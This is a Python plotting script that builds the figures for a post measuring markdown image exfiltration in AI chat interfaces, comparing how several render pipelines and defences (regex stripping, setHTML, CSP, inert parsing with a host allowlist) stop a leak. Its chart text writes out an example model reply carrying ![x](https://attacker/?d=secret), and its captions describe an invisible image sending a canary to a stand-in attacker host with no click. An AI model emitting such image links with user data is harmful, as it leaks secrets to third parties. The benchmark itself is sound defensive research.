#!/usr/bin/env python3
"""Build the webp images for the "markdown image exfiltration in chat UIs" post.

Usage:
  python3 scripts/markdown-image-exfil/gen_images.py --work <scratch-dir>

Reads scripts/data/markdown-image-exfil.json (bench.py) and
<work>/capture/ (capture.py: headless-Chromium screenshots and the attacker
host's access log for a few pages). Screenshots are cropped and scaled, not
edited; every number comes from the JSON.

Outputs:
  assets/img/headers/ai/ai-security-markdown-image-exfiltration-chat-ui.webp  (1600x840, 40:21)
  assets/img/posts/ai/markdown-image-exfil-matrix.webp
  assets/img/posts/ai/markdown-image-exfil-screens-and-log.webp
"""
import argparse
import io
import json
import os

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402
from matplotlib.colors import ListedColormap  # noqa: E402
from PIL import Image, ImageDraw, ImageFont  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
DATA = os.path.join(ROOT, "scripts", "data", "markdown-image-exfil.json")
OUT_HEAD = os.path.join(ROOT, "assets", "img", "headers", "ai")
OUT_POSTS = os.path.join(ROOT, "assets", "img", "posts", "ai")
F_BOLD = "/System/Library/Fonts/Supplemental/Arial Bold.ttf"
F_REG = "/System/Library/Fonts/Supplemental/Arial.ttf"
F_MONO = "/System/Library/Fonts/Menlo.ttc"

SHORT = {
    "innerhtml": "markdown-it -> innerHTML",
    "html_off": "markdown-it, html: false",
    "regex_strip": "Regex strips ![..](..)",
    "detached_filter": "Host filter on a detached <div>",
    "sethtml_img": "setHTML() + <img> allowed",
    "sethtml": "setHTML(), default Sanitizer",
    "inert_allowlist": "Inert parse + host allowlist",
    "csp": "CSP img-src allowlist",
    "csp_inert": "CSP + inert allowlist",
}
COLS = {
    "innerhtml": "innerHTML\n(html on)",
    "html_off": "html: false",
    "regex_strip": "regex strip\n![..](..)",
    "detached_filter": "filter on\ndetached div",
    "sethtml_img": "setHTML\n+ <img>",
    "sethtml": "setHTML\ndefault",
    "inert_allowlist": "inert parse\n+ allowlist",
    "csp": "CSP\nimg-src",
    "csp_inert": "CSP +\ninert",
}


def save_pil(img, path, quality=88):
    img.convert("RGB").save(path, "WEBP", quality=quality, method=6)
    print("wrote", os.path.relpath(path, ROOT), img.size, os.path.getsize(path), "bytes")


def save_fig(fig, path, size=None, quality=88):
    buf = io.BytesIO()
    fig.savefig(buf, format="png", dpi=100, facecolor=fig.get_facecolor())
    plt.close(fig)
    buf.seek(0)
    im = Image.open(buf).convert("RGB")
    if size and im.size != size:
        raise SystemExit("%s rendered at %s, expected %s" % (path, im.size, size))
    save_pil(im, path, quality)


def header(d):
    tot = d["totals"]
    order = ["innerhtml", "detached_filter", "regex_strip", "sethtml_img", "html_off", "csp", "inert_allowlist", "csp_inert"]
    n = tot["innerhtml"]["zero_click_cases"]
    nc = len([c for c in d["carriers"] if c["group"] in ("markdown", "html")])
    fig = plt.figure(figsize=(16, 8.4), dpi=100)
    fig.patch.set_facecolor("#0d1117")
    fig.text(0.05, 0.885, "Markdown image exfiltration in chat UIs, measured", color="#e6edf3", fontsize=36, weight="bold")
    fig.text(0.05, 0.815, "A model reply carrying ![x](https://attacker/?d=secret), %d zero-click shapes x %d replies. Share that reached the attacker:" % (
        nc, d["variants"]), color="#8b949e", fontsize=17.5)
    ax = fig.add_axes([0.33, 0.15, 0.61, 0.60])
    ax.set_facecolor("#0d1117")
    vals = [tot[p]["zero_click_leaked"] for p in order]
    colours = ["#f85149" if v / n > 0.6 else "#f0883e" if v / n > 0.3 else "#d29922" if v > 0 else "#3fb950" for v in vals]
    ys = list(range(len(vals)))[::-1]
    ax.barh(ys, [100.0 * v / n for v in vals], color=colours, height=0.62)
    for y, v in zip(ys, vals):
        ax.text(100.0 * v / n + 1.2, y, "%d%%  (%d/%d)" % (round(100.0 * v / n), v, n), va="center", color="#e6edf3", fontsize=18, weight="bold")
    ax.set_yticks(ys)
    ax.set_yticklabels([SHORT[p] for p in order], color="#e6edf3", fontsize=18)
    ax.set_xlim(0, 128)
    ax.set_xticks([])
    for s in ax.spines.values():
        s.set_visible(False)
    ax.tick_params(axis="y", length=0, pad=14)
    lat = d["innerhtml_leak_after_ms"]
    fig.text(0.05, 0.085, "Unfiltered, the secret reached the attacker %.0f ms (median) after navigation, with no click. "
             "Default setHTML() leaked 0 too, but hid every legitimate image." % lat["p50"], color="#8b949e", fontsize=14)
    fig.text(0.05, 0.045, "%s, markdown-it-py %s, %d pages x %d passes, identical every pass. Seed %d." % (
        d["browser"].replace("Google Chrome for Testing", "Headless Chromium"), d["markdown_it_py"], d["pages_per_pass"], d["passes"], d["seed"]),
        color="#8b949e", fontsize=14)
    save_fig(fig, os.path.join(OUT_HEAD, "ai-security-markdown-image-exfiltration-chat-ui.webp"), size=(1600, 840))


def matrix(d):
    pipes = [p["id"] for p in d["pipelines"]]
    rows = d["carriers"]
    n = d["variants"]
    fig = plt.figure(figsize=(14, 11.2), dpi=100)
    fig.patch.set_facecolor("white")
    ax = fig.add_axes([0.30, 0.08, 0.69, 0.80])
    grid, text = [], []
    for r in rows:
        g, t = [], []
        for p in pipes:
            c = r[p]
            if r["group"] == "control":
                ok = c["loaded_imgs"]
                g.append(0 if ok == n else 2)
                t.append("shown %d/%d" % (ok, n))
            elif r["group"] == "one-click":
                g.append(1 if c["link_to_evil"] else 0)
                t.append("link %d/%d" % (c["link_to_evil"], n) if c["link_to_evil"] else "no link")
            else:
                g.append(2 if c["leaked"] else 0)
                t.append(("%d/%d" % (c["leaked"], n)) + (" nav" if c["navigated_away"] else ""))
        grid.append(g)
        text.append(t)
    cmap = ListedColormap(["#c9f0d3", "#fff1c2", "#ffd8d3"])
    ax.imshow(grid, cmap=cmap, vmin=0, vmax=2, aspect="auto")
    for i, t in enumerate(text):
        for j, s in enumerate(t):
            ax.text(j, i, s, ha="center", va="center", fontsize=10.5, color="#1f2328",
                    weight="bold" if grid[i][j] == 2 else "normal")
    ax.set_xticks(range(len(pipes)))
    ax.set_xticklabels([COLS[p] for p in pipes], fontsize=11)
    ax.xaxis.tick_top()
    ax.set_yticks(range(len(rows)))
    ax.set_yticklabels([r["label"] for r in rows], fontsize=11.5)
    ax.tick_params(length=0)
    for k in range(1, len(rows)):
        if rows[k]["group"] != rows[k - 1]["group"]:
            ax.axhline(k - 0.5, color="#57606a", lw=1.5)
    ax.set_xticks([x - 0.5 for x in range(1, len(pipes))], minor=True)
    ax.set_yticks([y - 0.5 for y in range(1, len(rows))], minor=True)
    ax.grid(which="minor", color="white", lw=2)
    for s in ax.spines.values():
        s.set_visible(False)
    fig.text(0.01, 0.965, "Which reply shapes reached the attacker, per render pipeline (%d replies per cell)" % n,
             fontsize=16, weight="bold", color="#1f2328")
    fig.text(0.01, 0.03, "Red: the canary reached evil.localhost with no click (\"nav\": the whole tab navigated there). "
             "Yellow: a clickable link to the attacker survived.\nControls: green when the legitimate image still rendered, red when the defence removed it. "
             "%s, markdown-it-py %s, seed %d." % (d["browser"].replace("Google Chrome for Testing", "headless Chromium"), d["markdown_it_py"], d["seed"]),
             fontsize=10.5, color="#57606a")
    save_fig(fig, os.path.join(OUT_POSTS, "markdown-image-exfil-matrix.webp"), size=(1400, 1120))


def screens(work):
    cap = os.path.join(work, "capture")
    with open(os.path.join(cap, "capture.json")) as f:
        c = json.load(f)
    W, H = 1600, 900
    img = Image.new("RGB", (W, H), "white")
    dr = ImageDraw.Draw(img)
    fb = ImageFont.truetype(F_BOLD, 26)
    fr = ImageFont.truetype(F_REG, 19)
    fm = ImageFont.truetype(F_MONO, 15)
    fms = ImageFont.truetype(F_MONO, 14)
    dr.text((30, 18), "Same model reply, two render pipelines, and what the attacker's server logged", font=fb, fill=(31, 35, 40))
    panels = [("md_inline-0-innerhtml", "markdown-it -> innerHTML", (207, 34, 46)),
              ("md_inline-0-inert_allowlist", "inert parse + image host allowlist", (26, 127, 55))]
    for k, (pid, title, col) in enumerate(panels):
        x0 = 30 + k * 785
        shot = Image.open(os.path.join(cap, pid + ".png")).convert("RGB")
        crop = shot.crop((240, 0, 1040, 300))  # the chat column
        dr.text((x0, 66), title, font=fr, fill=col)
        img.paste(crop.resize((760, 285), Image.LANCZOS), (x0, 96))
        dr.rectangle((x0 - 1, 95, x0 + 760, 96 + 285), outline=(208, 215, 222), width=2)
        # The access log of that page load.
        dr.text((x0, 400), "Server log for this page load (ms after the page request):", font=fr, fill=(87, 96, 106))
        y = 432
        dr.rectangle((x0 - 1, 426, x0 + 760, 426 + 230), fill=(246, 248, 250), outline=(208, 215, 222))
        for r in c[pid]["requests"]:
            evil = "evil" in r["host"]
            line = "%6.1f  %-22s %s" % (r["ms"], r["host"].replace(":PORT", ""), r["path"].replace(":8940", ""))
            dr.text((x0 + 10, y), line, font=fm, fill=(207, 34, 46) if evil else (31, 35, 40))
            y += 26
        if not any("evil" in r["host"] for r in c[pid]["requests"]):
            dr.text((x0 + 10, y + 8), "evil.localhost: no request", font=fm, fill=(26, 127, 55))
    md = c["md_inline-0-innerhtml"]["md"].split("\n\n")[-1]
    dr.text((30, 690), "The reply's last line (markdown, as the model wrote it):", font=fr, fill=(87, 96, 106))
    dr.text((30, 720), md.replace(":PORT", ""), font=fm, fill=(31, 35, 40))
    dr.text((30, 770), "Left: the image is invisible (a 1x1 GIF), the user sees a normal answer, and the canary is in the attacker's log ~9 ms after the scripts loaded.",
            font=fr, fill=(31, 35, 40))
    dr.text((30, 800), "Right: the same markdown becomes the text \"[image blocked: status]\" and no request leaves the page.", font=fr, fill=(31, 35, 40))
    dr.text((30, 850), "Headless Chromium screenshots (cropped to the chat column) and the bench server's access log, from scripts/markdown-image-exfil/capture.py.",
            font=fms, fill=(87, 96, 106))
    save_pil(img, os.path.join(OUT_POSTS, "markdown-image-exfil-screens-and-log.webp"))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--work", required=True)
    a = ap.parse_args()
    with open(DATA) as f:
        d = json.load(f)
    os.makedirs(OUT_HEAD, exist_ok=True)
    os.makedirs(OUT_POSTS, exist_ok=True)
    header(d)
    matrix(d)
    screens(os.path.abspath(a.work))


if __name__ == "__main__":
    main()
